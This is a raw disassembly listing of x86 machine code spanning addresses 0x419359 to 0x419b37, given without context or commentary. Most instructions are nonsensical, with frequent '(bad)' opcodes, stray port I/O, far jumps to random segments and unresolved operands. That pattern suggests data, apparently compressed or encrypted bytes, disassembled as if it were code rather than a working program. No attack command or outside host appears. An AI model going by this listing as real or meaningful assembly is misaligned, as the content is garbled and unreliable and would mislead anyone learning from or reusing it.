  419359:	or     edx,eax
  41935b:	sub    eax,0xc4ff9cb0
  419360:	jb     0x13b9f018
  419366:	push   cs
  419367:	out    dx,al
  419368:	mov    cs,WORD PTR [eax-0x68d24ac0]
  41936e:	adc    DWORD PTR [edi+0x5d],0x45
  419372:	gs jg  0x4193ef
  419375:	push   cs
  419376:	jnp    0x41939e
  419378:	ret    0x5380
  41937b:	jg     0x4193b0
  41937d:	imul   esi,DWORD PTR [edx-0x4b302875],0x7c527387
  419387:	std    
  419388:	pop    esp
  419389:	xchg   esp,eax
  41938a:	jne    0x419339
  41938c:	jno    0x41933b
  41938e:	loop   0x419359
  419390:	push   eax
  419391:	ds mov ecx,0xbcf90cd1
  419397:	call   0xd6da781d
  41939c:	in     al,dx
  41939d:	lods   eax,DWORD PTR ds:[esi]
  41939e:	aaa    
  41939f:	iret   
  4193a0:	and    ecx,DWORD PTR [ecx]
  4193a2:	sub    ah,BYTE PTR [ecx+eiz*1-0x18]
  4193a6:	pop    ebp
  4193a7:	jnp    0x41938f
  4193a9:	adc    esi,DWORD PTR [edx+0x3a]
  4193ac:	outs   dx,BYTE PTR ds:[esi]
  4193ad:	cmp    eax,0x1887b85c
  4193b2:	shl    DWORD PTR [ecx],cl
  4193b4:	aam    0x5e
  4193b6:	push   ss
  4193b7:	mov    ah,0xad
  4193b9:	mov    esi,0xf8435c04
  4193be:	and    al,ah
  4193c0:	cmc    
  4193c1:	mov    esi,0x7dd197ba
  4193c6:	fnstsw WORD PTR [esi-0x51897c80]
  4193cc:	mov    ebp,0x27303c54
  4193d1:	rol    BYTE PTR [edi],1
  4193d3:	dec    ebx
  4193d4:	or     BYTE PTR [ecx],ch
  4193d6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4193d7:	aaa    
  4193d8:	jb     0x4193e3
  4193da:	xchg   ebp,eax
  4193db:	jmp    0xdad6:0xde4dc914
  4193e2:	rol    bh,0x68
  4193e5:	dec    ecx
  4193e6:	fcomp  DWORD PTR [ebx+eiz*1-0x37575498]
  4193ed:	pop    edx
  4193ee:	cmp    dh,cl
  4193f0:	bound  edi,QWORD PTR [ecx+eiz*8]
  4193f3:	add    esi,DWORD PTR [eax+0xdceddc]
  4193f9:	pop    ebx
  4193fa:	lock xchg esp,eax
  4193fc:	jmp    0x316df97b
  419401:	icebp  
  419402:	push   ecx
  419403:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419404:	ror    DWORD PTR [edx+0x6c32bd2c],1
  41940a:	mov    ebp,0x3f9d9531
  41940f:	daa    
  419410:	push   0xffffffea
  419412:	mov    bl,0x95
  419414:	dec    edi
  419415:	xchg   edx,eax
  419416:	imul   esp,DWORD PTR [esp+ecx*2+0x7],0xffffffa5
  41941b:	enter  0xaefd,0x24
  41941f:	push   0x76
  419421:	jecxz  0x419462
  419423:	jbe    0x419405
  419425:	jmp    0x9d1f0838
  41942a:	pop    edi
  41942b:	mov    ds:0x7dc9bcb8,al
  419430:	or     DWORD PTR [eax],ebx
  419432:	pop    edi
  419433:	inc    esi
  419434:	pop    ebp
  419435:	adc    DWORD PTR [ebx],0xf16cf91b
  41943b:	retf   
  41943c:	inc    edx
  41943d:	leave  
  41943e:	(bad)  
  419440:	sbb    DWORD PTR [edi],esp
  419442:	jbe    0x419442
  419444:	cmp    bl,BYTE PTR [esi+0x5e2a502c]
  41944a:	test   al,0x70
  41944c:	or     al,0x0
  41944e:	jo     0x41940e
  419450:	mov    dl,0x99
  419452:	mov    ebp,0xcbb4b78b
  419457:	xchg   esp,eax
  419458:	cwde   
  419459:	add    bh,BYTE PTR [ebx-0xce53ff5]
  41945f:	pop    edi
  419460:	jmp    0x143e4114
  419465:	in     eax,0x6d
  419467:	fcmovbe st,st(4)
  419469:	push   esp
  41946a:	cli    
  41946b:	out    dx,al
  41946c:	or     BYTE PTR [ebx],dh
  41946e:	out    dx,al
  41946f:	mov    bh,0x24
  419471:	pop    ebp
  419472:	and    al,0x18
  419474:	inc    esp
  419475:	in     eax,dx
  419476:	ins    BYTE PTR es:[edi],dx
  419477:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419478:	mov    eax,0x3ca689d8
  41947d:	mov    al,0x3
  41947f:	loope  0x4194e1
  419481:	mov    eax,esi
  419483:	and    esp,DWORD PTR [ecx+0x5e]
  419486:	push   ebp
  419487:	pop    esi
  419488:	push   0xfffffffd
  41948a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41948b:	jg     0x4194a4
  41948d:	jno    0x4194e9
  41948f:	stc    
  419490:	into   
  419491:	loopne 0x419496
  419493:	mov    edx,gs
  419495:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419496:	push   ds
  419497:	jmp    0x4194be
  419499:	(bad)  
  41949a:	push   esp
  41949b:	adc    al,0x37
  41949d:	pop    esi
  41949e:	leave  
  41949f:	mov    ebx,0xe318fa1e
  4194a4:	xchg   edi,eax
  4194a5:	mov    ebx,DWORD PTR [esi-0x51]
  4194a8:	addr16 push edi
  4194aa:	iret   
  4194ab:	dec    esp
  4194ac:	xchg   edi,eax
  4194ad:	mov    esi,0x97d0b804
  4194b2:	in     eax,dx
  4194b3:	jp     0x419456
  4194b5:	jo     0x4194ce
  4194b7:	xor    bh,BYTE PTR [bp-0x13f0]
  4194bc:	es mov edi,0x46bd62a2
  4194c2:	fdivrp st(1),st
  4194c4:	adc    DWORD PTR [ecx+0x77],ecx
  4194c7:	in     eax,0x12
  4194c9:	add    eax,0x5b98b78
  4194ce:	mov    edi,0xc36db941
  4194d3:	pop    ecx
  4194d4:	and    bh,BYTE PTR [edi]
  4194d6:	inc    eax
  4194d7:	aaa    
  4194d8:	or     dh,BYTE PTR [eax]
  4194da:	mov    bh,0xd1
  4194dc:	xchg   edx,eax
  4194dd:	icebp  
  4194de:	dec    esi
  4194df:	adc    dl,BYTE PTR [ecx-0x66c761d9]
  4194e5:	adc    eax,0xa26adcdb
  4194ea:	mov    eax,0x51a83802
  4194ef:	call   0x559489b1
  4194f4:	dec    ebp
  4194f5:	xlat   BYTE PTR ds:[ebx]
  4194f6:	icebp  
  4194f7:	rcl    ah,cl
  4194f9:	or     edx,edi
  4194fb:	out    0x56,eax
  4194fd:	inc    esp
  4194fe:	xchg   ebp,eax
  4194ff:	cwde   
  419500:	xchg   edi,eax
  419501:	pop    ss
  419502:	pop    eax
  419503:	and    eax,0x7bcfaf15
  419508:	xor    al,0xdb
  41950a:	ror    BYTE PTR [esi+0x32416a93],0x1c
  419511:	mov    bl,0xa5
  419513:	(bad)  
  419515:	out    0x41,eax
  419517:	cmp    DWORD PTR [eax+0x68],0x95e99035
  41951e:	mov    WORD PTR [ecx+0x5fc10839],?
  419524:	adc    edi,edi
  419526:	jns    0x41958a
  419528:	mov    edi,0x4353ac34
  41952d:	cmc    
  41952e:	jmp    0x2ccf:0x3117937f
  419535:	mov    bl,0xda
  419537:	daa    
  419538:	pusha  
  419539:	pop    ds
  41953a:	pop    ebp
  41953b:	dec    esi
  41953c:	xor    DWORD PTR [ebx+0x56f9c058],0x58
  419543:	adc    dh,BYTE PTR [ecx+0x52e8e202]
  419549:	adc    eax,0x101229e3
  41954e:	jns    0x4194fa
  419550:	mov    ds:0x30ebe204,eax
  419555:	jmp    0x9c9:0x46521d77
  41955c:	adc    eax,0xe8d61139
  419561:	dec    cx
  419563:	mov    dh,0x61
  419565:	bound  ebx,QWORD PTR [ebx-0x196ef828]
  41956b:	mov    esp,0x40069ed8
  419570:	add    BYTE PTR [edx+0x24443e34],0x99
  419577:	and    ah,BYTE PTR [eax]
  419579:	xchg   DWORD PTR [ecx+0x5f],esi
  41957c:	jge    0x41955c
  41957e:	xor    bh,BYTE PTR [esi]
  419580:	jp     0x41956c
  419582:	int3   
  419583:	mov    bh,0xbe
  419585:	mov    bl,ah
  419587:	fisub  DWORD PTR [ecx+0x20364cde]
  41958d:	lahf   
  41958e:	sbb    BYTE PTR [ecx+0x3d51c4d4],cl
  419594:	imul   ecx,DWORD PTR [ebp-0x5d],0xa82594b6
  41959b:	push   ebx
  41959c:	push   esp
  41959d:	xchg   BYTE PTR [ecx+0x76],al
  4195a0:	pop    DWORD PTR [edx+0x29]
  4195a3:	rcr    ecx,1
  4195a5:	pop    ss
  4195a6:	jle    0x419591
  4195a8:	addr16 (bad) 
  4195aa:	mov    ecx,gs
  4195ac:	sub    al,0x64
  4195ae:	dec    eax
  4195af:	lds    ebp,FWORD PTR [ebx+0x4b7fe420]
  4195b5:	pop    esp
  4195b6:	call   DWORD PTR [ebp+0x11109bb5]
  4195bc:	imul   ebp,DWORD PTR [ecx],0xffffff82
  4195bf:	(bad)  
  4195c0:	div    dh
  4195c2:	cli    
  4195c3:	xchg   DWORD PTR [ecx-0x1a97c2cd],edi
  4195c9:	jae    0x41958c
  4195cb:	sub    BYTE PTR [ecx+0x4e],ah
  4195ce:	inc    edi
  4195cf:	dec    ecx
  4195d0:	pop    ecx
  4195d1:	lds    ecx,FWORD PTR [ecx-0x3a1b485e]
  4195d7:	inc    DWORD PTR ds:0x91ec4fd9
  4195dd:	mov    ch,0x9a
  4195df:	fld    TBYTE PTR [ebx+0x70]
  4195e2:	ja     0x4195df
  4195e4:	aad    0xb7
  4195e6:	lahf   
  4195e7:	jb     0x419665
  4195e9:	leave  
  4195ea:	and    BYTE PTR [edx+0x32],0xf2
  4195ee:	mov    ds:0x53f97017,eax
  4195f3:	lea    eax,[edi+0x30bc0682]
  4195f9:	sub    esi,ebp
  4195fb:	retf   0x9eae
  4195fe:	mov    ecx,0x6addaf60
  419603:	leave  
  419604:	pop    ebp
  419605:	fist   DWORD PTR [ecx]
  419607:	ins    DWORD PTR es:[edi],dx
  419608:	iret   
  419609:	push   edi
  41960a:	into   
  41960b:	mov    bh,0x89
  41960d:	call   0x3ee9d8
  419612:	xor    DWORD PTR [esi],esp
  419614:	or     al,0xa4
  419616:	loope  0x4195b7
  419618:	fwait
  419619:	push   0xffffff82
  41961b:	fist   WORD PTR [edx]
  41961d:	scas   eax,DWORD PTR es:[edi]
  41961e:	mov    ebp,0x17e3a3e0
  419623:	sbb    dl,dh
  419625:	clc    
  419626:	push   0x5c
  419628:	mov    WORD PTR [ecx],gs
  41962a:	out    0x3c,eax
  41962c:	and    esi,DWORD PTR [edx-0x6a]
  41962f:	add    esi,DWORD PTR [eax+0x3ed6fab5]
  419635:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419636:	shl    BYTE PTR ds:0x8d5a6192,1
  41963c:	bound  ebp,QWORD PTR [eax]
  41963e:	inc    edi
  41963f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419640:	(bad)  
  419641:	ds pop ds
  419643:	sub    al,0x21
  419645:	into   
  419646:	ds sahf 
  419648:	jecxz  0x4196b7
  41964a:	jno    0x4195ec
  41964c:	in     al,dx
  41964d:	xor    ebx,edi
  41964f:	xchg   BYTE PTR [ebp+0x540a3bd7],ch
  419655:	lods   al,BYTE PTR ds:[esi]
  419656:	xlat   BYTE PTR ds:[ebx]
  419657:	out    0x87,al
  419659:	dec    esi
  41965a:	pop    ss
  41965b:	cmp    DWORD PTR [edi],eax
  41965d:	and    eax,0xe0196ef6
  419662:	xlat   BYTE PTR ds:[ebx]
  419663:	ret    
  419664:	cmp    DWORD PTR ds:0x6554f2d4,edx
  41966a:	outs   dx,BYTE PTR ds:[esi]
  41966b:	cmc    
  41966c:	js     0x41964d
  41966e:	push   ecx
  41966f:	fsub   DWORD PTR [edi-0x4c]
  419672:	ffreep st(0)
  419674:	jl     0x419610
  419676:	lea    esi,[bp+di+0x4132]
  41967b:	push   ebx
  41967c:	std    
  41967d:	push   edx
  41967e:	sbb    al,0x17
  419680:	sub    DWORD PTR [edi+ecx*8+0x4c],ebp
  419684:	or     DWORD PTR [esi-0x34107604],eax
  41968a:	mov    ecx,0x7a91d628
  41968f:	mov    fs,WORD PTR ds:[edx-0x71]
  419693:	jmp    0xa44b:0xa7e253f2
  41969a:	out    0x4d,eax
  41969c:	and    BYTE PTR [edi-0x4d649af2],dl
  4196a2:	and    bh,ah
  4196a4:	pop    esp
  4196a5:	sahf   
  4196a6:	lods   eax,DWORD PTR ds:[esi]
  4196a7:	gs jne 0x419674
  4196aa:	loope  0x419683
  4196ac:	pop    ds
  4196ad:	and    al,0xef
  4196af:	scas   al,BYTE PTR es:[edi]
  4196b0:	jne    0x419636
  4196b2:	mov    es,WORD PTR [eax]
  4196b4:	cwde   
  4196b5:	mov    esp,0x5b2167c7
  4196ba:	jmp    0x4196dc
  4196bc:	push   eax
  4196bd:	mov    WORD PTR [ebx],?
  4196bf:	enter  0x480f,0x45
  4196c3:	and    dh,BYTE PTR [edi+0x48eb7099]
  4196c9:	mov    eax,ds:0xbe19ba3d
  4196ce:	xor    BYTE PTR [ebp-0x337f0cf1],ch
  4196d4:	sbb    BYTE PTR [esi],0xa3
  4196d7:	stc    
  4196d8:	mov    ebx,0xecef33b2
  4196dd:	adc    esp,DWORD PTR [edx+ebp*8+0x78b54e72]
  4196e4:	pop    ecx
  4196e5:	ficomp DWORD PTR ds:0x693e3213
  4196eb:	add    DWORD PTR [ecx+0x2b91bbf9],ebp
  4196f1:	out    0x6d,al
  4196f3:	test   DWORD PTR [ebx+0x1f],edi
  4196f6:	cmp    al,0x85
  4196f8:	push   es
  4196f9:	adc    esp,DWORD PTR [edi]
  4196fb:	and    ebx,DWORD PTR [edx+0x41]
  4196fe:	mov    ch,0x50
  419700:	inc    esi
  419701:	das    
  419702:	fdivr  DWORD PTR [edx]
  419704:	jle    0x4196f6
  419706:	cmp    bh,BYTE PTR [eax]
  419708:	lea    ebp,[edi+0x75]
  41970b:	pop    ss
  41970c:	into   
  41970d:	mov    eax,0x8e126142
  419712:	retf   
  419713:	sahf   
  419714:	add    DWORD PTR [eax-0x2ac77f41],edx
  41971a:	bound  edi,QWORD PTR [ebp+ebx*1-0x58bb45ff]
  419721:	daa    
  419722:	mov    al,ds:0xa707d45d
  419727:	iret   
  419728:	rcr    DWORD PTR [esp+ebx*1-0x62],0x5
  41972d:	(bad)  
  41972e:	js     0x41973b
  419730:	fcomp  st(4)
  419732:	lea    esi,[ecx+0x21]
  419735:	dec    ecx
  419736:	call   0xa729:0xf3cf3520
  41973d:	call   0x233c:0xf858147c
  419744:	mov    edx,0xbf2e68fa
  419749:	and    BYTE PTR [edx+0x33],dl
  41974c:	push   ds
  41974d:	mov    edi,0xe5e59a0e
  419752:	sub    al,0xda
  419754:	fisub  DWORD PTR [ebx-0x6711ba1d]
  41975a:	mov    eax,ds:0x374a027d
  41975f:	(bad)  
  419760:	mov    ah,0x3e
  419762:	xlat   BYTE PTR ds:[ebx]
  419763:	cs or  ebx,edi
  419766:	into   
  419767:	imul   eax,DWORD PTR [ebx],0x52
  41976a:	mov    esi,0x405eadda
  41976f:	test   al,0x68
  419771:	mov    WORD PTR [eax-0x5192c3e3],?
  419777:	push   cs
  419778:	sti    
  419779:	stc    
  41977a:	les    eax,FWORD PTR [ebx-0x61]
  41977d:	pop    es
  41977e:	xchg   esp,eax
  41977f:	les    eax,FWORD PTR [ebx+0x158c028a]
  419785:	dec    eax
  419786:	sbb    bh,al
  419788:	bound  ebp,QWORD PTR [edi-0x22ce2fe4]
  41978e:	mov    esp,0x2ab4231b
  419793:	sub    BYTE PTR [eax],bh
  419795:	pop    ds
  419796:	mov    ebx,0x8f4d86b7
  41979b:	mov    ebx,0x95ebd8f6
  4197a0:	into   
  4197a1:	shr    dl,0x0
  4197a4:	xor    BYTE PTR [ebx-0x2d],dh
  4197a7:	stc    
  4197a8:	and    DWORD PTR [edi+0x4517d674],ebp
  4197ae:	jmp    0x2f0483e0
  4197b3:	dec    esp
  4197b4:	daa    
  4197b5:	inc    ebp
  4197b6:	dec    ecx
  4197b7:	rol    BYTE PTR [ecx+0x63],cl
  4197ba:	in     al,0x97
  4197bc:	fdivr  QWORD PTR [esi]
  4197be:	pop    ebx
  4197bf:	xlat   BYTE PTR ds:[ebx]
  4197c0:	xchg   esp,eax
  4197c1:	(bad)  
  4197c2:	pop    ss
  4197c3:	dec    ecx
  4197c4:	mov    ss,WORD PTR [ebx]
  4197c6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4197c7:	cmc    
  4197c8:	cmp    al,0xce
  4197ca:	std    
  4197cb:	loop   0x419849
  4197cd:	call   FWORD PTR [esi]
  4197cf:	mov    ch,BYTE PTR [esi+eiz*1]
  4197d2:	gs push ecx
  4197d4:	je     0x41982b
  4197d6:	sub    DWORD PTR [ecx-0x59],esp
  4197d9:	sahf   
  4197da:	jg     0x419851
  4197dc:	call   0xd128:0xc8e0c801
  4197e3:	adc    DWORD PTR [ebp-0x3eb30821],eax
  4197e9:	imul   esi,DWORD PTR [eax],0x50
  4197ec:	sub    DWORD PTR [eax],edx
  4197ee:	dec    esi
  4197ef:	mov    ?,WORD PTR [ecx-0x1a]
  4197f2:	sub    BYTE PTR [ebx],0xe3
  4197f5:	(bad)  
  4197f6:	jbe    0x419807
  4197f8:	into   
  4197f9:	ret    
  4197fa:	push   ecx
  4197fb:	mov    ch,0x4e
  4197fd:	jle    0x41981e
  4197ff:	in     al,dx
  419800:	mov    ?,WORD PTR [eax-0x57c9f36a]
  419806:	push   ebp
  419807:	arpl   bx,cx
  419809:	pop    ss
  41980a:	lahf   
  41980b:	or     cl,BYTE PTR [edx]
  41980d:	add    DWORD PTR [eax-0x43],eax
  419810:	cmp    DWORD PTR [ecx+0x6768fd87],ebx
  419816:	lock sub cl,BYTE PTR ss:[ebp-0x50]
  41981b:	ins    BYTE PTR es:[edi],dx
  41981c:	jno    0x41989c
  41981e:	nop
  41981f:	or     eax,edx
  419821:	mov    ds,edi
  419823:	scas   al,BYTE PTR es:[edi]
  419824:	test   al,0x71
  419826:	(bad)  
  419827:	adc    al,cl
  419829:	jns    0x4197ea
  41982b:	inc    ebp
  41982c:	inc    ebp
  41982d:	in     eax,0xba
  41982f:	xchg   ecx,eax
  419830:	mov    ds:0x5e0971f5,eax
  419835:	rol    BYTE PTR [ebp-0xfa58f49],1
  41983b:	xchg   BYTE PTR [ebx-0x58d33051],al
  419841:	jmp    0x62b39e3c
  419846:	repz dec eax
  419848:	jge    0x419847
  41984a:	jnp    0x4197f2
  41984c:	sbb    bl,BYTE PTR [esi-0x32]
  41984f:	and    BYTE PTR [esi],dh
  419851:	pop    ds
  419852:	retf   0xe923
  419855:	mov    eax,ds:0xdaabadc6
  41985a:	add    al,0x70
  41985c:	xchg   esi,eax
  41985d:	jge    0x41984e
  41985f:	jns    0x4197ec
  419861:	call   0xf661b65c
  419866:	in     al,dx
  419867:	jg     0x4198b7
  419869:	dec    ebp
  41986a:	test   eax,0x22eaec50
  41986f:	fwait
  419870:	sub    DWORD PTR [edi+0x76c59ebb],edi
  419876:	mov    BYTE PTR [edx+eiz*4+0x11],bl
  41987a:	and    eax,0x653708b0
  41987f:	cmp    BYTE PTR [ebp+ebx*1-0x572620a6],ah
  419886:	hlt    
  419887:	hlt    
  419888:	rcr    bh,1
  41988a:	jnp    0x419903
  41988c:	adc    DWORD PTR [ebx+ebp*2+0x23461de1],edx
  419893:	aas    
  419894:	and    ebx,ebx
  419896:	out    0xac,eax
  419898:	mov    ds:0x4db22f2a,al
  41989d:	xor    BYTE PTR [ebx*1-0x41e8fa69],0xf6
  4198a5:	shr    BYTE PTR [esi*8+0x3e701e3a],cl
  4198ac:	ret    0x61d4
  4198af:	fimul  DWORD PTR [ebp+0x5f77a40d]
  4198b5:	mov    edi,0x6e25ce5f
  4198ba:	xchg   esp,eax
  4198bb:	(bad)  
  4198bc:	aam    0x8f
  4198be:	shl    BYTE PTR [ebx+0x4f6e237c],1
  4198c4:	push   es
  4198c5:	ins    DWORD PTR es:[edi],dx
  4198c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4198c7:	xchg   esi,eax
  4198c8:	arpl   WORD PTR [ecx],bp
  4198ca:	stos   DWORD PTR es:[edi],eax
  4198cb:	mov    al,0xba
  4198cd:	add    ecx,DWORD PTR [ecx+0x6]
  4198d0:	cmp    eax,0xa7b97d8
  4198d5:	mov    ah,0xa8
  4198d7:	ret    
  4198d8:	outs   dx,DWORD PTR ds:[esi]
  4198d9:	and    al,0x69
  4198db:	or     cl,BYTE PTR [eax+0x5d9b574f]
  4198e1:	aad    0xe5
  4198e3:	bound  edi,QWORD PTR [edx-0x7f]
  4198e6:	retf   0x2845
  4198e9:	mov    ebp,0x3f14ad5f
  4198ee:	lds    ebx,FWORD PTR [edi]
  4198f0:	lods   eax,DWORD PTR ds:[esi]
  4198f1:	daa    
  4198f2:	aam    0x78
  4198f4:	jo     0x41991b
  4198f6:	xchg   esi,eax
  4198f7:	push   edi
  4198f8:	jge    0x4198e2
  4198fa:	mov    ecx,0x5de5d749
  4198ff:	aas    
  419900:	(bad)  
  419901:	fistp  WORD PTR [esi+0x5e]
  419904:	sub    al,0x6
  419906:	and    eax,ebp
  419908:	xor    al,0xaa
  41990a:	mov    ah,0xb0
  41990c:	inc    eax
  41990d:	je     0x419945
  41990f:	mov    BYTE PTR [eax],cl
  419911:	xor    BYTE PTR [edi+0x66],bh
  419914:	xchg   esi,eax
  419915:	and    cl,bh
  419917:	xor    DWORD PTR [ebp+0x84c2539],edx
  41991d:	cmp    DWORD PTR [eax-0x5a],esi
  419920:	jle    0x4198aa
  419922:	sub    eax,0x42b496be
  419927:	cmp    al,0xff
  419929:	add    eax,0xf5af125f
  41992e:	aad    0x2b
  419930:	in     eax,0x69
  419932:	shr    dl,1
  419934:	stos   BYTE PTR es:[edi],al
  419935:	add    bh,BYTE PTR [ebx-0x51]
  419938:	mov    al,ds:0xda06496f
  41993d:	jl     0x419933
  41993f:	dec    edx
  419940:	mov    al,0x6b
  419942:	out    dx,al
  419943:	cmp    al,0xbf
  419945:	imul   edx,DWORD PTR [eax+0x592438bb],0xe
  41994c:	test   DWORD PTR [ebp-0x6e3cd64],eax
  419952:	cmp    BYTE PTR [ebx+0x65c15303],0xff
  419959:	xchg   ebx,eax
  41995a:	repz cmp esi,DWORD PTR [ecx-0x18]
  41995e:	xor    edi,DWORD PTR [ebp-0x37f31ef5]
  419964:	xor    DWORD PTR [edx],0x3146f434
  41996a:	xchg   DWORD PTR [edi+0x57],ebx
  41996d:	mov    ebp,fs
  41996f:	push   0xffffffc9
  419971:	cli    
  419972:	and    al,ch
  419974:	dec    esp
  419975:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419976:	xchg   BYTE PTR [edi+0x76],ah
  419979:	xchg   edi,eax
  41997a:	out    0x64,eax
  41997c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41997d:	adc    DWORD PTR [esi-0x3f32d6f9],ebp
  419983:	adc    bl,BYTE PTR [eax+eiz*1-0xe5f042b]
  41998a:	mov    edx,0x4b5cbff4
  41998f:	mov    esi,0x149dadae
  419994:	push   ds
  419995:	xlat   BYTE PTR ds:[ebx]
  419996:	dec    edi
  419997:	sahf   
  419998:	mov    cl,0x0
  41999a:	dec    edi
  41999b:	or     DWORD PTR [ebp-0x38],0xffffffc6
  41999f:	sub    ebx,ecx
  4199a1:	cmp    al,0x99
  4199a3:	(bad)  
  4199a4:	dec    esi
  4199a5:	out    dx,eax
  4199a6:	sti    
  4199a7:	ins    BYTE PTR es:[edi],dx
  4199a8:	(bad)  
  4199a9:	aas    
  4199aa:	(bad)  
  4199ac:	into   
  4199ad:	adc    BYTE PTR [ebx+0x44bd9e0f],ah
  4199b3:	aad    0xfc
  4199b5:	xchg   DWORD PTR [edi-0x2dd3dbad],esp
  4199bb:	test   eax,0x2add8d11
  4199c0:	lods   eax,DWORD PTR ds:[esi]
  4199c1:	jmp    0x31ae:0x5f3b72d2
  4199c8:	jns    0x4199b2
  4199ca:	pop    esi
  4199cb:	in     eax,0xa2
  4199cd:	in     al,dx
  4199ce:	lods   eax,DWORD PTR ds:[esi]
  4199cf:	test   eax,0x350ae9bc
  4199d4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4199d5:	mov    dh,0x66
  4199d7:	jne    0x41997f
  4199d9:	add    al,0x90
  4199db:	mov    esp,0xa25ad151
  4199e0:	rol    DWORD PTR [ebp+0x764a51fe],1
  4199e6:	stos   BYTE PTR es:[edi],al
  4199e7:	mov    al,BYTE PTR [eax-0x50933063]
  4199ed:	and    dl,bh
  4199ef:	jl     0x4199fd
  4199f1:	clc    
  4199f2:	dec    ebx
  4199f3:	aad    0x37
  4199f5:	push   ds
  4199f6:	mov    eax,0xa888a89
  4199fb:	dec    esi
  4199fc:	xor    al,BYTE PTR [esi+0x225369e3]
  419a02:	loopne 0x4199e8
  419a04:	or     ecx,edi
  419a06:	test   DWORD PTR [esi-0x46],0xfe52747f
  419a0d:	call   0xf56f:0x8a5ba986
  419a14:	adc    DWORD PTR ds:0x9e73c9d6,ecx
  419a1a:	cwde   
  419a1b:	add    al,0x19
  419a1d:	adc    DWORD PTR [ecx-0xb499c62],ecx
  419a23:	push   edi
  419a24:	out    dx,al
  419a25:	push   eax
  419a26:	xchg   esp,eax
  419a27:	dec    eax
  419a28:	xchg   esi,eax
  419a29:	daa    
  419a2a:	and    ebp,ecx
  419a2c:	mov    cl,0xf1
  419a2e:	retf   0x2bc2
  419a31:	add    al,0x6b
  419a33:	pop    DWORD PTR [eax+0x4]
  419a36:	lods   eax,DWORD PTR ds:[esi]
  419a37:	xchg   esp,eax
  419a38:	shl    BYTE PTR [eax+0x546f76cf],0x83
  419a3f:	add    dh,BYTE PTR [edi+0x138cdf3b]
  419a45:	inc    ebx
  419a46:	pop    edi
  419a47:	icebp  
  419a48:	cli    
  419a49:	xor    BYTE PTR [ebx],cl
  419a4b:	icebp  
  419a4c:	add    eax,0xf6eff058
  419a51:	shl    BYTE PTR [edi],0xf0
  419a54:	rol    DWORD PTR [edx],0xf4
  419a57:	(bad)  
  419a58:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  419a5a:	cmp    dh,ah
  419a5c:	push   ebp
  419a5d:	addr16 out 0xd4,al
  419a60:	test   DWORD PTR [eax-0x78],esi
  419a63:	dec    ecx
  419a64:	stc    
  419a65:	cmp    al,0xc5
  419a67:	imul   ecx,ecx,0xffffffe4
  419a6a:	xchg   esi,eax
  419a6b:	rol    BYTE PTR [esi-0x78b59c4],1
  419a71:	push   ss
  419a72:	xchg   edx,eax
  419a73:	cmp    DWORD PTR [edx],ecx
  419a75:	shl    DWORD PTR ds:0x7ed4c210,1
  419a7b:	mov    al,0x7d
  419a7d:	push   ecx
  419a7e:	inc    eax
  419a7f:	inc    ah
  419a81:	cmp    DWORD PTR [edx-0x4a],0x284f5f81
  419a88:	mov    ah,0x9a
  419a8a:	addr16 push es
  419a8c:	jbe    0x419a6b
  419a8e:	shl    dh,1
  419a90:	loop   0x419a4a
  419a92:	mov    ebp,0xf0f5057
  419a97:	xchg   bl,bh
  419a99:	nop
  419a9a:	cmp    al,BYTE PTR [eax-0xa34c3c6]
  419aa0:	mov    dl,0x66
  419aa2:	lds    ebx,FWORD PTR [edi]
  419aa4:	ja     0x419ad8
  419aa6:	fstp   DWORD PTR [esi+0x42]
  419aa9:	and    ah,BYTE PTR [ebp-0x43]
  419aac:	ins    DWORD PTR es:[edi],dx
  419aad:	and    edx,edx
  419aaf:	jae    0x419ab7
  419ab1:	outs   dx,DWORD PTR ds:[esi]
  419ab2:	push   esp
  419ab3:	pop    es
  419ab4:	leave  
  419ab5:	or     cl,dh
  419ab7:	xchg   sp,ax
  419ab9:	sub    bl,BYTE PTR [esi+0x3f]
  419abc:	pop    ds
  419abd:	shl    DWORD PTR ss:[ebx+0x6e],0xd0
  419ac2:	addr16 mov eax,0x6f2746ab
  419ac8:	stc    
  419ac9:	pop    esp
  419aca:	ror    DWORD PTR [ebx+0x7b4634f3],0xe1
  419ad1:	retf   
  419ad2:	fiadd  DWORD PTR [esi-0xd8a849]
  419ad8:	repnz in eax,dx
  419ada:	push   cs
  419adb:	sbb    esi,DWORD PTR [esi+0x1a]
  419ade:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419adf:	sti    
  419ae0:	cdq    
  419ae1:	inc    eax
  419ae2:	mov    bl,0x7e
  419ae4:	mov    ah,0x2c
  419ae6:	daa    
  419ae7:	push   0x8e0d7c86
  419aec:	loope  0x419aa6
  419aee:	and    edx,esi
  419af0:	push   edx
  419af1:	hlt    
  419af2:	jne    0x419a95
  419af4:	shl    BYTE PTR [ecx-0x6f41d8e8],0xea
  419afb:	add    ebx,DWORD PTR gs:[esi-0x22cd2a7d]
  419b02:	cdq    
  419b03:	cwde   
  419b04:	dec    ecx
  419b05:	mov    dl,BYTE PTR [ebx]
  419b07:	sub    al,0x50
  419b09:	mov    DWORD PTR [edx-0xf],edx
  419b0c:	fcomi  st,st(4)
  419b0e:	retf   0xe410
  419b11:	arpl   WORD PTR [edx+0x5c],sp
  419b14:	push   ebp
  419b15:	test   BYTE PTR [esi],al
  419b17:	or     esi,esi
  419b19:	out    dx,eax
  419b1a:	inc    esi
  419b1b:	call   0x41bf:0x679db7c9
  419b22:	mov    ecx,0xe74a4604
  419b27:	xlat   BYTE PTR ds:[ebx]
  419b28:	jecxz  0x419b15
  419b2a:	js     0x419b5e
  419b2c:	xchg   esi,eax
  419b2d:	rol    BYTE PTR [ebx],0x86
  419b30:	stos   DWORD PTR es:[edi],eax
  419b31:	ins    DWORD PTR es:[edi],dx
  419b32:	push   ds
  419b33:	add    esi,DWORD PTR [edi+0x7b]
  419b36:	ins    DWORD PTR es:[edi],dx
  419b37:	add    esp,DWORD PTR [esi-0x65]
